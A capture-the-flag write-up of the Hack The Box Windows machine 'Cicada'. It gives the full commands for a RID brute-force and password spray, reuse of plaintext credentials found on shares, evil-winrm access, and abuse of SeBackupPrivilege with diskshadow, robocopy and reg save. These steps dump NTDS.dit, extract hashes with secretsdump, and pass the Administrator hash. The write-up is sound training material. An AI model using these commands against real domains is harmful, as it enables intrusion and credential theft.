```json
Alias: Cicada
Date: 13-10_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.10.11.35
```

# Cicada
# Summary

Cicada is an easy difficulty windows machine. We start by having anonymous access on a smb share that gives us a default password used by the company. We perform an rid brute to find users on the machine and do a password spray against them using the default password. This leads to us finding a user who has their default password in ther LDAP description. With having control of this account we can access the Dev share that contains a backup script including the password of another user. Using this account we can WinRM into the Domain Controller. This user has the `SeBackupPrivilege` we leverage this to create a copy of the NTDS and get all hashes on the domain.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-13 03:51 PKT
Nmap scan report for 10.10.11.35
Host is up (0.14s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-13 05:51:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-10-13T05:52:34
|_  start_date: N/A
|_clock-skew: 6h59m58
```
## Discovered Subdomains
```
cicada.htb
```

---
# Enumeration

The `HR` share is accessible by anonymous users. It contains a notice from HR file.

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

We do have a default password but no username.

Doing a RID bruteforce we get some users

```shell
nxc smb $IP -u 'abcd' -p '' --rid-brute

1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

---

# Exploitation

## Password Spray

Using the above usernames, we can try a password spray using the default password we found.

and we find the following user:

| User              | Password                 |
| ----------------- | ------------------------ |
| michael.wrightson | Cicada$M6Corpb*@Lp#nZp!8 |

---

# Lateral Movement

### David Orelious

Listing the properties of `david.orelious`'s account

```shell
ldapsearch -x -H ldap://$IP -D "CN=MICHAEL WRIGHTSON,CN=USERS,DC=cicada,DC=htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "dc=cicada,dc=htb" "(sAMAccountName=david.orelious)"
```

We see this in the description

```
description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

| Username       | Password       |
| -------------- | -------------- |
| david.orelious | aRt$Lp#7t*VQ!3 |

### Emily Oscars

With David's account, we now have access to the Dev share, which contains a backup script

```powershell

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

| Username     | Password         |
| ------------ | ---------------- |
| emily.oscars | Q!3@Lp#M6b*7t*Vt |
and Emily can winrm into the machine

```shell
evil-winrm -i $IP -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```


---

# Privilege Escalation

## Local Enumeration

Doing a `whoami` reveals that Emily is a backup operator. She has the `SeBackupPrivilege` and `SeRestorePrivilege`. This means that she can read and backup any file on the system. So we are going to take advantage of this to read `NTDS.dit`, this is the file present on domain controllers that store the Hashes for all domain users.

### Exploitation

We can't directly do this because the file is in use by the system, so we will have to use the `diskshadow` command to create a copy of the disk and get the `NTDS.dit` from the shadow copy.

```shell
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Write this to a file on your machine, then convert it to dos format using this

```shell
unix2dos() { awk "sub(\"\$\", \"\r\")" $1 > $2; }
unix2dos dshadow.txt doshadow.txt
```

Then, upload it to the machine using winrm and pass it to diskshadow

```shell
upload doshadow.txt
diskshadow /s doshadow.txt
```

Now you should have a shadow copy of C drive on E and we can save a copy of the `NTDS.dit` using `robocopy`. We need `robocopy` because the usual `copy` command does not make use of the backup privileges we have, it will treat us like a normal user. `robocopy` will help with making use of the privileges.

```shell
robocopy /b E:\Windows\ntds . ntds.dit
```

Next, we get the system registry hive that contains the keys needed to decrypt the NTDS file with the `**reg save**` command.

```shell
reg save hklm\system system.bak
```

Then we can download the files we just made using winrm

```shell
download system.bak
download ntds.dit
```

And finally get the good stuff using `secrtsdump`

```shell
secretsdump.py -ntds ./ntds.dit -system ./system.bak LOCAL
```

| Username      | Hash                             |
| ------------- | -------------------------------- |
| Administrator | 2b87e7c93a3e8a0ea4a581937016f341 |
Use `evil-winrm` to log in as admin

```shell
evil-winrm -i $IP -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

#CTF #CTF/Hackthebox #CTF/Hackthebox/Easy #Window #Windows/BackupOperators 
